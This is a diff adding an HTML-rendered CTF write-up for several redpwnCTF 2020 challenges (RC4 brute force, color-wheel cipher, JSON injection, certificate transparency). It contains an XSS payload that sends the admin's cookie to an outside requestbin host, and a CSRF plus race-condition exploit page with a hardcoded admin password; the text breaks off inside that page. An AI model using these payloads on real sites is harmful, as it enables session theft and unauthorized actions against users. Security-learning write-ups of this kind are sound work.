+    <span class="k">if</span> <span class="n">password_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
+        <span class="n">testkey</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">l</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
+        <span class="k">if</span> <span class="n">rc4</span><span class="p">(</span><span class="n">password</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">generate_key</span><span class="p">(</span><span class="n">testkey</span><span class="p">))</span> <span class="o">==</span> <span class="n">password_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+            <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+            <span class="k">break</span>
+<span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</code></pre></div>
+
+<p>output : <br />
+<code>ysnnltu_idr_aoug_iy_fptd_ics_htaopidr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}ysnnp{idtsltu_idr_aoug</code> <br />
+the next thing to do is to find the key length, we can assume the key length as <code>len("ysnnp{idtsltu_idr_aoug_iy_fptd_ics_htaopps}")</code>.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;X&quot;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s2">&quot;ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">&quot;</span><span class="p">))]</span>
+<span class="n">flag_enc</span> <span class="o">=</span> <span class="s2">&quot;ysnnltu_idr_aoug_iy_fptd_ics_htaopidr_aoug_iy_fptd_ics_htaopps}ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp</span><span class="si">{idtsltu_idr_aoug_iy_fptd_ics_htaopps}</span><span class="s2">ysnnp{idtsltu_idr_aoug&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)):</span>
+    <span class="n">flag</span><span class="p">[(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)]</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+<span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</code></pre></div>
+
+<p>output : <code>id_and_python_is_stupid}flag{crypto_is_stup</code> <br />
+My solution may look atupid and lazy but actually I tried to find some way to decrypt the rc4() function however I can't really find it, so I believe that this is the actual intended solution.  </p>
+
+<p>flag : <code>flag{crypto_is_stupid_and_python_is_stupid}</code></p>
+
+<h1>12-shades-of-red-pwn</h1>
+
+<blockquote>
+  <p><strong>ALERT</strong> This one is a guessy chall</p>
+</blockquote>
+
+<p>We are given two images
+<img src="ciphertext.jpg" alt="a" />
+<img src="color-wheel.jpg" alt="b" /></p>
+
+<p>And the hint says :</p>
+
+<pre><code>Everyone's favorite guess god Tux just sent me a flag that he somehow encrypted with a color wheel!
+
+I don't even know where to start, the wheel looks more like a clock than a cipher... can you help me crack the code?
+</code></pre>
+
+<p>So the color wheel is basically just a number in a clock <code>0 starts at bright yellow color on very top</code> and goes on to the color on the right</p>
+
+<p>And we just have to convert the color in first image with the number based on the  color-wheel, convert it using base-12</p>
+
+<p>And we got the flag</p>
+
+<p>flag = <code>flag{9u3ss1n9_1s_4n_4rt}</code></p>
+
+<h1>pastebin</h1>
+
+<blockquote>
+  <p>I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it <a target="_blank" href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin">here</a> <br />
+  Site: https://static-pastebin.2020.redpwnc.tf <br />
+  For this challenge I use a very nice <a target="_blank" href="https://xsshunter.com/">tool</a> to solve it, the flag is the admin's cookie <br />
+  flag : <code>flag{54n1t1z4t10n_k1nd4_h4rd}</code>  </p>
+</blockquote>
+
+<h1>panda-facts</h1>
+
+<blockquote>
+  <p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down! <br />
+  Site: panda-facts.2020.redpwnc.tf <br />
+  The concept is pretty much the same with any injection vulnerabilities, we can insert <code>name", "member" : 1, "x" : "somethingtomatchthequotationmarks</code> as our username, and it will inject a value of member and set it to 1, then x just to match the quotation marks.</p>
+</blockquote>
+
+<p>flag : <code>flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}</code></p>
+
+<h1>static-static-hosting</h1>
+
+<blockquote>
+  <p>This is another xss challenge with a better filter so we have to craft a better payload basically</p>
+</blockquote>
+
+<p>I struggle really hard on this one because the filter are just really strong, and i come up with a working <code>iframe</code> payload</p>
+
+<p>But it didn't work, and when i asked the organizer it turns out that the admin site are using chrome to run the payload </p>
+
+<p>And with the fact that using <code>iframe</code> will create another child element thus creating a situation where we can't take the admin's cookie because of <strong>chrome</strong> (insert chrome jokes here)</p>
+
+<p>so I came up with another solution</p>
+
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:javascript:alert(document.cookie);&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>It turns out that we can use frame and run js inside of the <code>src</code></p>
+
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:javascript:(function() {</span>
+<span class="s">        var xmlHttp = new XMLHttpRequest();</span>
+<span class="s">        xmlHttp.open(&#39;POST&#39;, &#39;https://en8nxg3ahdy8p.x.pipedream.net&#39;, false );</span>
+<span class="s">        xmlHttp.send(btoa(document.cookie));</span>
+<span class="s">        return xmlHttp.responseText;   </span>
+<span class="s">    })();&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>So by creating payload like that, it will grab admin's cookie when the admin visit the site and send the cookie to our site in request bin and in this case the flag</p>
+
+<p>flag = <code>flag{wh0_n33d5_d0mpur1fy}</code></p>
+
+<h1>anti-textbook</h1>
+
+<blockquote>
+  <p>This is the most interesting challenge from all web challenge i've come up so far in so many ctf's</p>
+</blockquote>
+
+<p>We are only given this <code>n</code> and <code>e</code></p>
+
+<pre><code>e: 65537
+n: 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561
+</code></pre>
+
+<p>And i that it must be something related to an RSA crypto, <br />
+looking at the hint : </p>
+
+<pre><code>It's important for public keys to be transparent.
+
+Hint: certificate-transparency.org
+</code></pre>
+
+<p>So thanks to @Wrth guess, we might be able to create a certificate from those 2 numbers</p>
+
+<p>And i come up with this script to convert <code>e</code> and <code>n</code> to a <code>.pem</code> certificate</p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+
+<span class="n">exponent</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">modulus</span> <span class="o">=</span> <span class="mi">23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561</span>
+<span class="n">numbers</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">exponent</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">numbers</span><span class="o">.</span><span class="n">public_key</span><span class="p">(</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+<span class="n">pem</span> <span class="o">=</span> <span class="n">public_key</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
+    <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span>
+    <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span>
+<span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And we got a <code>.pem</code> certificate :</p>
+
+<pre><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUwe
+T8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/
+C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9
+FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuT
+VXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9
+ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZ
+oQIDAQAB
+-----END PUBLIC KEY-----
+</code></pre>
+
+<p>We can convert this certificate to sha256 hash and then search for related sha256 certificate in <a target="_blank" href="https://censys.io/">https://censys.io/</a></p>
+
+<p>I use this openssl script to convert <code>.pem</code> to sha256 hash</p>
+
+<div class="codehilite"><pre><span></span><code>openssl rsa -in pubkey.pem -pubin -outform der <span class="p">|</span> openssl dgst -sha256
+</code></pre></div>
+
+<p>find the related site with that sha256 certificate this way <br />
+https://censys.io/certificates?q=9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f</p>
+
+<p>And we got a website that has the flag inside</p>
+
+<p>flag = <code>flag{c3rTific4t3_7r4n5pArAncY_fTw}</code></p>
+
+<h1>cookie-recipes-v2</h1>
+
+<blockquote>
+  <p>I'm really proud that i can complete this challenge because its 'kinda' something new to me</p>
+</blockquote>
+
+<p>So we are given a site with a persistent cookie (that also works as csrf) and the important thing is that every process will just rely on that static csrf cookie so it must be a csrf attack, but by reviewing the code</p>
+
+<p>I see some interesting things happens when we want the admin to give a <code>gift</code> to our account, there is this TOC-TOU vulnerability leading us to racing condition attack</p>
+
+<p>So in summary its a combination between csrf and race condition attack</p>
+
+<p>The plan here are</p>
+
+<pre><code>1. Create a malicious site with very-finely(i tried hard so much on this) crafted exploit inside
+2. Create a link to the site using awesome php+ngrok combo
+3. Let the admin visit the site and do that csrf+race_condition attack for us
+</code></pre>
+
+<p>Here's my exploit code</p>
+
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="c">&lt;!-- admin pass = n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn --&gt;</span>
+    <span class="c">&lt;!-- remote url = https://cookie-recipes-v2.2020.redpwnc.tf --&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
